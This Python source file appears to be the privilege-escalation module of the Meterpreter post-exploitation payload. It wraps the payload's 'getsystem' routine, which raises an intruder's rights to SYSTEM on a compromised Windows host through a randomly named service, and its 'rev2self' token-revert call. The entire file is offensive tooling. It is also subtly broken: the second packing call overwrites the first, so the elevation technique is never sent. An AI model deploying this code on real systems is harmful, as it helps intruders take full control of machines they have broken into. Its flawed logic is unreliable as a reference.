import meterpreter_bindings

from meterpreter.core import *

TLV_PRIV_EXTENSION = 20000

TLV_TYPE_ELEVATE_TECHNIQUE    = TLV_META_TYPE_UINT   | (TLV_PRIV_EXTENSION + 200)
TLV_TYPE_ELEVATE_SERVICE_NAME = TLV_META_TYPE_STRING | (TLV_PRIV_EXTENSION + 201)

# We only support technique 1 (as it's the only one that doesn't require DLLs)
def getsystem():
  tlv = tlv_pack(TLV_TYPE_ELEVATE_TECHNIQUE, 1)
  tlv = tlv_pack(TLV_TYPE_ELEVATE_SERVICE_NAME, rnd_string(5))
  resp = invoke_meterpreter('priv_elevate_getsystem', True, tlv)
  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def rev2self():
  resp = invoke_meterpreter('stdapi_sys_config_rev2self', True)
  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0
